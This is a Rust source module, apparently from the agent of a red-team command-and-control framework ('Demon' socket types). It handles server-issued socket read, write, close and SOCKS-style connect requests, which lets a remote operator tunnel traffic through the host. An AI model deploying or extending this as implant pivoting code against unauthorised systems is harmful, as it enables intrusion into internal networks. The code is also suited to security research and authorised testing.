use red_cell_common::demon::DemonSocketType;
use tracing::warn;

use super::super::super::socket_io::{
    connect_socks_target, encode_socket_connect, encode_socket_write_failure, parse_bytes_le,
    parse_u32_le, raw_socket_error, write_all_nonblocking,
};
use super::super::super::types::ManagedSocket;
use super::super::{SocketError, SocketState};

impl SocketState {
    pub(in super::super) fn handle_socket_read(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        let socket_type_raw = parse_u32_le(rest, &mut offset)?;
        let socket_type = DemonSocketType::try_from(socket_type_raw)
            .map_err(|_| SocketError::Parse("unknown socket type"))?;
        let success = parse_u32_le(rest, &mut offset)? != 0;

        if success {
            let data = parse_bytes_le(rest, &mut offset)?;
            self.write_to_socket(request_id, socket_id, socket_type, &data)?;
        } else {
            let error_code = parse_u32_le(rest, &mut offset)?;
            warn!(socket_id, error_code, "socket read failed (from server)");
        }

        Ok(())
    }

    pub(in super::super) fn handle_socket_write(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        let data = parse_bytes_le(rest, &mut offset)?;

        let mut write_failure = None;
        if let Some(socket) = self.sockets.get_mut(&socket_id) {
            if let Err(error) = write_all_nonblocking(&mut socket.stream, &data) {
                write_failure = Some((socket.socket_type, raw_socket_error(&error)));
            }
        }
        if let Some((socket_type, error_code)) = write_failure {
            self.queue_response(
                request_id,
                encode_socket_write_failure(socket_id, socket_type, error_code),
            );
            self.remove_socket(socket_id);
        }

        Ok(())
    }

    pub(in super::super) fn handle_socket_close(&mut self, rest: &[u8]) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;
        self.remove_socket(socket_id);
        Ok(())
    }

    pub(in super::super) async fn handle_socket_connect(
        &mut self,
        request_id: u32,
        rest: &[u8],
    ) -> Result<(), SocketError> {
        let mut offset = 0;
        let socket_id = parse_u32_le(rest, &mut offset)?;

        if rest.len() <= offset {
            return Err(SocketError::Parse("buffer too short for atyp"));
        }
        let atyp = rest[offset];
        offset += 1;

        let host = parse_bytes_le(rest, &mut offset)?;

        if rest.len() < offset + 2 {
            return Err(SocketError::Parse("buffer too short for port"));
        }
        let port_bytes: [u8; 2] = rest[offset..offset + 2]
            .try_into()
            .map_err(|_| SocketError::Parse("port conversion failed"))?;
        let port = u16::from_le_bytes(port_bytes);

        match connect_socks_target(atyp, &host, port).await {
            Ok(stream) => {
                self.sockets.insert(
                    socket_id,
                    ManagedSocket {
                        stream,
                        socket_type: DemonSocketType::ReverseProxy,
                        bind_addr: 0,
                        bind_port: u32::from(port),
                        forward_addr: 0,
                        forward_port: 0,
                    },
                );
                self.queue_response(request_id, encode_socket_connect(true, socket_id, 0));
            }
            Err(error_code) => {
                self.queue_response(
                    request_id,
                    encode_socket_connect(false, socket_id, error_code),
                );
            }
        }

        Ok(())
    }

    fn write_to_socket(
        &mut self,
        request_id: u32,
        socket_id: u32,
        expected_type: DemonSocketType,
        data: &[u8],
    ) -> Result<(), SocketError> {
        let Some(socket) = self.sockets.get_mut(&socket_id) else {
            warn!(socket_id, "socket not found for write");
            return Ok(());
        };

        let socket_type = socket.socket_type;
        if socket_type != expected_type {
            warn!(socket_id, ?socket_type, ?expected_type, "socket type mismatch");
            return Ok(());
        }

        if let Err(error) = write_all_nonblocking(&mut socket.stream, data) {
            let error_code = raw_socket_error(&error);
            self.queue_response(
                request_id,
                encode_socket_write_failure(socket_id, socket_type, error_code),
            );
            self.remove_socket(socket_id);
        }

        Ok(())
    }
}
